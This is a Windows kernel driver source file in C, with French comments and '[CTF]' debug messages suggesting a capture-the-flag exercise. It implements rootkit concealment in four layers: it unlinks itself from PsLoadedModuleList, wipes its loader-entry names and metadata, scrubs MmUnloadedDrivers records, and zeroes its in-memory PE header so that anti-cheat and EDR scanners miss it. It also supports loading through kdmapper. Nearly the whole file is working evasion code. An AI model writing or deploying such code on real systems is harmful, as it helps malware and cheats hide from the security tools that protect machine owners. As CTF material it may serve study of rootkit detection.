#include "driver.h"

static PLDR_DATA_TABLE_ENTRY g_ModuleEntry = NULL;
static PLIST_ENTRY           g_SavedFlink  = NULL;
static PLIST_ENTRY           g_SavedBlink  = NULL;
static BOOLEAN               g_MapperMode  = FALSE;
static PVOID                 g_ImageBase   = NULL;
static ULONG                 g_ImageSize   = 0;

// ---------------------------------------------------------------------------
// Retrouver notre propre base PE depuis l'intérieur du code
//
// Technique : scan vers le bas depuis l'adresse de DriverEntry,
// page par page, jusqu'à trouver la signature MZ + PE valide.
// Fonctionne que le driver soit chargé normalement ou via mapper.
// ---------------------------------------------------------------------------
PVOID FindSelfBase(VOID)
{
    ULONG_PTR addr = (ULONG_PTR)DriverEntry & ~(PAGE_SIZE - 1);

    for (ULONG i = 0; i < 0x200; i++, addr -= PAGE_SIZE) {
        __try {
            PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)addr;
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) continue;
            if (dos->e_lfanew <= 0 || dos->e_lfanew >= 0x400) continue;

            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(addr + dos->e_lfanew);
            if (nt->Signature == IMAGE_NT_SIGNATURE)
                return (PVOID)addr;
        }
        __except (EXCEPTION_EXECUTE_HANDLER) { continue; }
    }
    return NULL;
}

// ---------------------------------------------------------------------------
// Couche 1 : retrait de PsLoadedModuleList  (mode sc uniquement)
// ---------------------------------------------------------------------------
VOID HideFromLoadedList(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    g_ModuleEntry = entry;
    g_SavedFlink  = entry->InLoadOrderLinks.Flink;
    g_SavedBlink  = entry->InLoadOrderLinks.Blink;

    RemoveEntryList(&entry->InLoadOrderLinks);
    InitializeListHead(&entry->InLoadOrderLinks);
    DbgPrint("[CTF] Couche 1 : retiré de PsLoadedModuleList\n");
}

// ---------------------------------------------------------------------------
// Couche 2 : effacement des champs identifiants dans LDR_DATA_TABLE_ENTRY
// ---------------------------------------------------------------------------
VOID ObfuscateLdrEntry(_In_ PDRIVER_OBJECT DriverObject)
{
    PLDR_DATA_TABLE_ENTRY entry = (PLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) return;

    if (entry->FullDllName.Buffer && entry->FullDllName.Length > 0) {
        RtlSecureZeroMemory(entry->FullDllName.Buffer, entry->FullDllName.Length);
        entry->FullDllName.Length = entry->FullDllName.MaximumLength = 0;
    }
    if (entry->BaseDllName.Buffer && entry->BaseDllName.Length > 0) {
        RtlSecureZeroMemory(entry->BaseDllName.Buffer, entry->BaseDllName.Length);
        entry->BaseDllName.Length = entry->BaseDllName.MaximumLength = 0;
    }
    entry->TimeDateStamp = 0;
    entry->CheckSum      = 0;
    DbgPrint("[CTF] Couche 2 : métadonnées LDR effacées\n");
}

// ---------------------------------------------------------------------------
// Couche 3 : nettoyage de MmUnloadedDrivers
// ---------------------------------------------------------------------------
VOID CleanMmUnloadedDrivers(PVOID ImageBase, ULONG ImageSize)
{
    UNICODE_STRING name1 = RTL_CONSTANT_STRING(L"MmUnloadedDrivers");
    UNICODE_STRING name2 = RTL_CONSTANT_STRING(L"MmLastUnloadedDriver");

    PMM_UNLOADED_DRIVER pTable = (PMM_UNLOADED_DRIVER)MmGetSystemRoutineAddress(&name1);
    PULONG              pLast  = (PULONG)MmGetSystemRoutineAddress(&name2);

    if (!pTable || !pLast) {
        DbgPrint("[CTF] Couche 3 : MmUnloadedDrivers non exporté, skip\n");
        return;
    }

    PVOID imageEnd = (PVOID)((ULONG_PTR)ImageBase + ImageSize);
    for (ULONG i = 0; i < MM_UNLOADED_DRIVERS_SIZE; i++) {
        if (pTable[i].ModuleStart >= ImageBase && pTable[i].ModuleStart < imageEnd) {
            if (pTable[i].Name.Buffer) {
                RtlSecureZeroMemory(pTable[i].Name.Buffer, pTable[i].Name.Length);
                pTable[i].Name.Length = pTable[i].Name.MaximumLength = 0;
                pTable[i].Name.Buffer = NULL;
            }
            pTable[i].ModuleStart = pTable[i].ModuleEnd = NULL;
            pTable[i].UnloadTime  = 0;
        }
    }
    DbgPrint("[CTF] Couche 3 : MmUnloadedDrivers nettoyé\n");
}

// ---------------------------------------------------------------------------
// Couche 4 : effacement de l'en-tête PE en mémoire
//
// Les scanners de mémoire noyau (anti-cheat, EDR) cherchent la signature
// "MZ" + PE valide dans les pages noyau. Zeroing la première page supprime
// cet indicateur sans affecter l'exécution du code déjà en mémoire.
// ---------------------------------------------------------------------------
VOID ErasePeHeader(PVOID ImageBase)
{
    if (!ImageBase) return;

    PMDL mdl = IoAllocateMdl(ImageBase, PAGE_SIZE, FALSE, FALSE, NULL);
    if (!mdl) return;

    __try {
        MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
        PVOID rw = MmMapLockedPagesSpecifyCache(mdl, KernelMode,
                        MmNonCached, NULL, FALSE, NormalPagePriority);
        if (rw) {
            RtlSecureZeroMemory(rw, PAGE_SIZE);
            MmUnmapLockedPages(rw, mdl);
        }
        MmUnlockPages(mdl);
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[CTF] Couche 4 : exception zeroing PE header\n");
    }
    IoFreeMdl(mdl);
    DbgPrint("[CTF] Couche 4 : en-tête PE effacé\n");
}

// ---------------------------------------------------------------------------
// Restauration avant déchargement (mode sc uniquement)
// ---------------------------------------------------------------------------
VOID RestoreSelf(VOID)
{
    if (!g_ModuleEntry || !g_SavedBlink) return;

    g_ModuleEntry->InLoadOrderLinks.Flink = g_SavedBlink->Flink;
    g_ModuleEntry->InLoadOrderLinks.Blink = g_SavedBlink;
    g_SavedBlink->Flink->Blink = &g_ModuleEntry->InLoadOrderLinks;
    g_SavedBlink->Flink        = &g_ModuleEntry->InLoadOrderLinks;
    g_ModuleEntry = NULL;
    DbgPrint("[CTF] PsLoadedModuleList restauré\n");
}

VOID DriverUnload(_In_ PDRIVER_OBJECT DriverObject)
{
    if (!g_MapperMode) {
        CleanMmUnloadedDrivers(DriverObject->DriverStart, DriverObject->DriverSize);
        RestoreSelf();
    }
    DbgPrint("[CTF] Driver déchargé\n");
}

// ---------------------------------------------------------------------------
// DriverEntry
//
// Convention d'appel kdmapper :
//   DriverObject  = NULL (premier paramètre)
//   RegistryPath  = NULL (deuxième paramètre)
//
// kdmapper résout les relocations et les imports avant d'appeler DriverEntry.
// Le driver est déjà en mémoire noyau mais n'est enregistré nulle part
// (pas de PsLoadedModuleList, pas de registre, pas de PiDDBCacheTable).
// On n'a donc qu'à effacer l'en-tête PE et s'assurer de ne pas crasher
// en touchant des structures inexistantes.
// ---------------------------------------------------------------------------
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    DbgPrint("[CTF] DriverEntry\n");

    // Retrouver notre propre base dans tous les cas
    g_ImageBase = FindSelfBase();

    if (DriverObject && DriverObject->DriverSection) {
        // --- Mode chargement standard (sc / NtLoadDriver) ---
        g_MapperMode = FALSE;
        g_ImageSize  = DriverObject->DriverSize;
        DriverObject->DriverUnload = DriverUnload;

        HideFromLoadedList(DriverObject);  // Couche 1
        ObfuscateLdrEntry(DriverObject);   // Couche 2
        // Couche 3 appliquée au déchargement dans DriverUnload

    } else {
        // --- Mode kdmapper ---
        // PsLoadedModuleList, registre, PiDDBCacheTable : déjà vierges.
        // Rien à delier. On se contente de la couche 4.
        g_MapperMode = TRUE;
        DbgPrint("[CTF] Mode kdmapper détecté\n");
    }

    // Couche 4 : efface le header PE en mémoire (tous modes)
    ErasePeHeader(g_ImageBase);

    DbgPrint("[CTF] Dissimulation terminée (mode %s, base=%p)\n",
             g_MapperMode ? "kdmapper" : "standard", g_ImageBase);
    return STATUS_SUCCESS;
}
